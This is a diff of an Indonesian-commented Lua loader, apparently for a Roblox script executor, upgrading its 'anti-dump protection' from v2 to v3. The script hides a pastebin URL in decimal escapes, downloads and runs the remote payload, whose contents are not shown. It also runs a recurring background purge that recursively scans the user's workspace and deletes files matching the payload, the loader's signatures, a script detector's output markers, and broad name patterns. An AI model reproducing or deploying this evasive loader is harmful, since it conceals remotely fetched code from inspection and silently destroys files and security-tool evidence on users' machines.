@@ -1,62 +1,100 @@
--- ═══════════════════════════════════════════════════════════════════
---  ANTI-DUMP PROTECTION v2 — Enhanced (Recursive + Payload-Aware)
---  Signature : PROTC_7X9K2Q_LOADER
---  Targets   : Script Detector (Gui Detection v5.8) & dumpers sejenis
--- ═══════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
+--  ANTI-DUMP PROTECTION v3 — Robust & Debuggable
+--  Fix utama: root workspace TIDAK hardcoded (v2 gagal karena selalu
+--             pakai "workspace", padahal root sebenarnya "" atau ".")
+-- ═══════════════════════════════════════════════════════════════════════
 
 local PAYLOAD_URL = "\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\88\107\78\113\82\68\70\118"
 
--- Signature yang dicari di ISI file
+-- Signature di ISI file
 local SIGS = {
-    "PROTC_7X9K2Q_LOADER",   -- marker di loader source
-    "XkNqRDFv",              -- fragmen URL pastebin kita
+    "PROTC_7X9K2Q_LOADER",
+    "XkNqRDFv",
 }
 
--- Pola pada NAMA file (case-insensitive)
+-- Pola pada NAMA file (lowercase)
 local NAME_PATTERNS = {
     "xknqrdfv",
     "engine_active",
+    "engine active",
 }
 
--- Pola nama file timestamp: Script_2026-11-05_05-57-23.txt
+-- Penanda bahwa file adalah dump dari Script Detector (Gui Detection)
+local DETECTOR_MARKERS = {
+    "Gui Detection",
+    "PERFORMANCE OPTIMIZED",
+    "MasterLogs",
+    "pushToUIPanel",
+    "createToggleRow",
+}
+
+-- Folder yang agresif dibersihkan
+local CLEAN_FOLDERS = { "download script", "downloads", "dumps" }
+
+-- Pola nama file di folder clean → hapus langsung
+local AUTO_DELETE_NAME_PATTERNS = {
+    "^https_", "^http_",
+    "^script_%d%d%d%d%-",
+    "engine[_ ]active",
+}
+
+-- Timestamp pada nama file dump detector (Script_YYYY-MM-DD_HH-MM-SS.txt)
 local TS_PATTERN = "script_%d%d%d%d%-%d%d%-%d%d_%d%d%-%d%d%-%d%d"
 
--- Folder tempat detector menyimpan dump
-local DET_FOLDERS = { "download script", "downloads", "dumps" }
-
-local SCAN_INTERVAL = 5
-local MAX_DEPTH      = 4
-local MAX_FILES      = 500
-local MAX_LOG_LINES  = 20
+local SCAN_INTERVAL = 4
+local MAX_DEPTH      = 5
+local MAX_FILES      = 800
+local DEBUG          = true   -- set true untuk lihat semua langkah
 
 local function log(tag, msg)
+    if tag == "DEBUG" and not DEBUG then return end
     print(string.format("[PROTECT][%s] %s", tag, tostring(msg)))
 end
 
-local function normalize(s)
-    if type(s) ~= "string" then return nil end
-    return (s:gsub("\r\n", "\n"))
+-- ═══════════════════════════════════════════════════════════
+--  ROOT DETECTION — INI YANG HILANG DI v2
+-- ═══════════════════════════════════════════════════════════
+local ROOT_CANDIDATES = { "", ".", "workspace", "/" }
+
+local function findWorkingRoot()
+    for _, root in ipairs(ROOT_CANDIDATES) do
+        local ok, items = pcall(listfiles, root)
+        if ok and type(items) == "table" then
+            log("DEBUG", string.format("listfiles(%q) → %d item", root, #items))
+            if #items > 0 then return root end
+        else
+            log("DEBUG", string.format("listfiles(%q) → GAGAL", root))
+        end
+    end
+    -- Kalau semua kosong tapi ada yang ok, pakai yang ok
+    for _, root in ipairs(ROOT_CANDIDATES) do
+        local ok, items = pcall(listfiles, root)
+        if ok and type(items) == "table" then return root end
+    end
+    return nil
 end
 
-local PAYLOAD_NORMALIZED = nil
-
-local function matchesPayload(content)
-    if not PAYLOAD_NORMALIZED or type(content) ~= "string" then return false end
-    local n = normalize(content); if not n then return false end
-    if n == PAYLOAD_NORMALIZED then return true end
-    local len = math.min(200, #n, #PAYLOAD_NORMALIZED)
-    if len >= 100 and n:sub(1, len) == PAYLOAD_NORMALIZED:sub(1, len) then
-        return true
-    end
-    return false
+local WORKSPACE_ROOT = findWorkingRoot()
+if not WORKSPACE_ROOT then
+    log("ERROR", "Tidak bisa menemukan root workspace. listfiles tidak didukung?")
+    return
 end
+log("INIT", string.format("Root workspace terdeteksi: %q", WORKSPACE_ROOT))
 
-local function inDetFolder(path)
-    local lp = path:lower()
-    for _, f in ipairs(DET_FOLDERS) do
-        if lp:find(f, 1, true) then return true end
+-- ═══════════════════════════════════════════════════════════
+--  PATH HELPERS
+-- ═══════════════════════════════════════════════════════════
+local function isDir(path)
+    if isfolder then
+        local ok, r = pcall(isfolder, path)
+        if ok then return r end
     end
-    return false
+    if isfile then
+        local ok, r = pcall(isfile, path)
+        if ok then return not r end
+    end
+    local ok = pcall(readfile, path)
+    return not ok
 end
 
 local function safeRead(path)
@@ -65,118 +103,174 @@ local function safeRead(path)
     return nil
 end
 
-local function safeIsFile(path)
-    if isfile then
-        local ok, r = pcall(isfile, path)
-        if ok then return r end
-    end
-    return pcall(readfile, path)
+local function normalize(s)
+    if type(s) ~= "string" then return nil end
+    return (s:gsub("\r\n", "\n"))
 end
 
 local function safeDelete(path)
     if not pcall(delfile, path) then return false end
-    if isfile then
-        local chk, still = pcall(isfile, path)
-        if chk and still then return false end
-    end
+    -- verifikasi
+    local ok = pcall(readfile, path)
+    if ok then return false end   -- masih bisa dibaca = belum terhapus
     return true
 end
 
-local function classifyFile(path)
-    local lp = path:lower()
-
-    -- 1) Nama file cocok
-    for _, pat in ipairs(NAME_PATTERNS) do
-        if lp:find(pat, 1, true) then return "name:" .. pat end
+local PAYLOAD_NORMALIZED = nil
+local function matchesPayload(content)
+    if not PAYLOAD_NORMALIZED or type(content) ~= "string" then return false end
+    local n = normalize(content)
+    if not n then return false end
+    if n == PAYLOAD_NORMALIZED then return true end
+    local len = math.min(200, #n, #PAYLOAD_NORMALIZED)
+    if len >= 100 and n:sub(1, len) == PAYLOAD_NORMALIZED:sub(1, len) then
+        return true
     end
+    return false
+end
 
+local function inCleanFolder(path)
+    local lp = path:lower()
+    for _, f in ipairs(CLEAN_FOLDERS) do
+        if lp:find(f, 1, true) then return true end
+    end
+    return false
+end
+
+-- ═══════════════════════════════════════════════════════════
+--  CLASSIFIER
+-- ═══════════════════════════════════════════════════════════
+local function classify(path)
+    local lp = path:lower()
     local content = safeRead(path)
 
-    -- 2) Isi file mengandung signature kita
-    if content then
-        for _, sig in ipairs(SIGS) do
-            if content:find(sig, 1, true) then return "content:" .. sig end
+    -- 1) Nama file cocok pola signature
+    for _, pat in ipairs(NAME_PATTERNS) do
+        if lp:find(pat, 1, true) then
+            return "name:" .. pat
         end
     end
 
-    -- 3) Output detector di folder Download Script
-    if inDetFolder(path) then
+    -- 2) Isi file mengandung signature
+    if content then
+        for _, sig in ipairs(SIGS) do
+            if content:find(sig, 1, true) then
+                return "content:" .. sig
+            end
+        end
+        -- 3) Isi file = payload kita
+        if matchesPayload(content) then
+            return "payload-match"
+        end
+        -- 4) Isi file = dump dari detector (mengandung marker detector)
+        for _, marker in ipairs(DETECTOR_MARKERS) do
+            if content:find(marker, 1, true) then
+                return "detector-dump:" .. marker
+            end
+        end
+    end
+
+    -- 5) Di folder clean → cek pola nama
+    if inCleanFolder(path) then
+        for _, pat in ipairs(AUTO_DELETE_NAME_PATTERNS) do
+            if lp:find(pat) then
+                return "clean-folder-name:" .. pat
+            end
+        end
+        -- File timestamp Script_YYYY-... di Download Script
         if lp:find(TS_PATTERN) then
-            if matchesPayload(content) then return "payload dump" end
-            if content and content:find("Gui Detection", 1, true) then
-                return "detector tag"
-            end
-            if content and #content > 500 then
-                return "detector folder script"
-            end
+            return "clean-folder-timestamp"
         end
     end
 
     return nil
 end
 
-local function scanDir(dir, depth, counter, logs)
-    if depth > MAX_DEPTH or counter.count >= MAX_FILES then return end
+-- ═══════════════════════════════════════════════════════════
+--  RECURSIVE SCAN
+-- ═══════════════════════════════════════════════════════════
+local function scanDir(dir, depth, counter)
+    if depth > MAX_DEPTH or counter.files >= MAX_FILES then return end
+
     local ok, items = pcall(listfiles, dir)
-    if not ok or type(items) ~= "table" then return end
+    if not ok or type(items) ~= "table" then
+        log("DEBUG", "listfiles gagal: " .. dir)
+        return
+    end
+    log("DEBUG", string.format("Scan %q → %d item", dir, #items))
 
     for _, path in ipairs(items) do
-        if counter.count >= MAX_FILES then return end
+        if counter.files >= MAX_FILES then break end
 
-        if safeIsFile(path) then
-            counter.count = counter.count + 1
-            local reason = classifyFile(path)
+        if isDir(path) then
+            scanDir(path, depth + 1, counter)
+        else
+            counter.files = counter.files + 1
+            local reason = classify(path)
             if reason then
                 counter.found = counter.found + 1
-                if #logs < MAX_LOG_LINES then
-                    log("TERDETEKSI", string.format("%s (%s)", path, reason))
-                    logs[#logs + 1] = path
-                elseif #logs == MAX_LOG_LINES then
-                    log("TERDETEKSI", "... (deteksi lain disembunyikan)")
-                    logs[#logs + 1] = "cap"
-                end
-
+                log("TERDETEKSI", string.format("%s (%s)", path, reason))
                 if safeDelete(path) then
                     counter.deleted = counter.deleted + 1
-                    if counter.deleted <= MAX_LOG_LINES then
-                        log("DIHAPUS", path)
-                    end
+                    log("DIHAPUS", path)
                 else
                     log("GAGAL", path)
                 end
             end
-        else
-            scanDir(path, depth + 1, counter, logs)
         end
     end
 end
 
 local function purgeOnce(label)
-    local counter = { count = 0, found = 0, deleted = 0 }
-    local logs = {}
-    log("PENCARIAN", string.format("Memindai workspace (%s)...", label or "scan"))
-    scanDir("workspace", 0, counter, logs)
-
+    local counter = { files = 0, found = 0, deleted = 0 }
+    log("PENCARIAN", string.format("Memindai (%s) dari root %q...", label, WORKSPACE_ROOT))
+    scanDir(WORKSPACE_ROOT, 0, counter)
     if counter.found == 0 then
-        log("BERHASIL", string.format("Bersih — %d file diperiksa", counter.count))
+        log("BERHASIL", string.format("Bersih — %d file diperiksa", counter.files))
     else
-        log("BERHASIL", string.format(
-            "%d ditemukan / %d dihapus / %d diperiksa",
-            counter.found, counter.deleted, counter.count))
+        log("BERHASIL", string.format("%d ditemukan / %d dihapus / %d diperiksa",
+            counter.found, counter.deleted, counter.files))
     end
-    return counter.found, counter.deleted
+    return counter
 end
 
 -- ═══════════════════════════════════════════════════════════
---  CEK API FILE
+--  CEK FILE API
 -- ═══════════════════════════════════════════════════════════
-local hasFileAPI = (listfiles and readfile and delfile) and true or false
-if not hasFileAPI then
-    log("WARN", "File API tidak tersedia di executor ini. Anti-dump dilewati.")
+if not (listfiles and readfile and delfile) then
+    log("WARN", "File API tidak tersedia. Anti-dump dilewati.")
+    return
 end
 
 -- ═══════════════════════════════════════════════════════════
---  STEP 1: Fetch payload (di sini detector menyimpan file URL)
+--  DEBUG HOOK — panggil _G.__ANTIDUMP_DEBUG__() untuk dump isi workspace
+-- ═══════════════════════════════════════════════════════════
+_G.__ANTIDUMP_DEBUG__ = function()
+    print("╔══════════════════ ANTIDUMP DEBUG ══════════════════╗")
+    print("Root terdeteksi:", WORKSPACE_ROOT)
+    local function walk(dir, depth)
+        local ok, items = pcall(listfiles, dir)
+        if not ok or type(items) ~= "table" then return end
+        for _, p in ipairs(items) do
+            local prefix = string.rep("  ", depth)
+            local d = isDir(p)
+            print(prefix .. (d and "📁 " or "📄 ") .. p)
+            if d and depth < 4 then walk(p, depth + 1) end
+        end
+    end
+    walk(WORKSPACE_ROOT, 0)
+    print("╚════════════════════════════════════════════════════╝")
+end
+
+-- ═══════════════════════════════════════════════════════════
+--  MANUAL SCAN — panggil _G.__ANTIDUMP_SCAN__() kapan saja
+-- ═══════════════════════════════════════════════════════════
+_G.__ANTIDUMP_SCAN__ = function()
+    return purgeOnce("manual")
+end
+
+-- ═══════════════════════════════════════════════════════════
+--  STEP 1: Fetch payload
 -- ═══════════════════════════════════════════════════════════
 log("FETCH", "Mengambil payload...")
 local fOk, payload = pcall(game.HttpGet, game, PAYLOAD_URL)
@@ -188,21 +282,19 @@ PAYLOAD_NORMALIZED = normalize(payload)
 log("FETCH", string.format("Payload: %d bytes", #payload))
 
 -- ═══════════════════════════════════════════════════════════
---  STEP 2: Purge awal (tangkap file URL yang baru dibuat)
+--  STEP 2: Purge awal
 -- ═══════════════════════════════════════════════════════════
-if hasFileAPI then purgeOnce("post-fetch") end
+purgeOnce("post-fetch")
 
 -- ═══════════════════════════════════════════════════════════
---  STEP 3: Background purger (tangkap dump yang dibuat saat run)
+--  STEP 3: Background purger
 -- ═══════════════════════════════════════════════════════════
-if hasFileAPI then
-    task.spawn(function()
-        while true do
-            task.wait(SCAN_INTERVAL)
-            pcall(purgeOnce, "background")
-        end
-    end)
-end
+task.spawn(function()
+    while true do
+        task.wait(SCAN_INTERVAL)
+        pcall(purgeOnce, "background")
+    end
+end)
 
 -- ═══════════════════════════════════════════════════════════
 --  STEP 4: Eksekusi payload
@@ -220,7 +312,5 @@ end
 -- ═══════════════════════════════════════════════════════════
 --  STEP 5: Purge final
 -- ═══════════════════════════════════════════════════════════
-if hasFileAPI then
-    task.wait(1)
-    purgeOnce("post-execute")
-end
+task.wait(1)
+purgeOnce("post-execute")
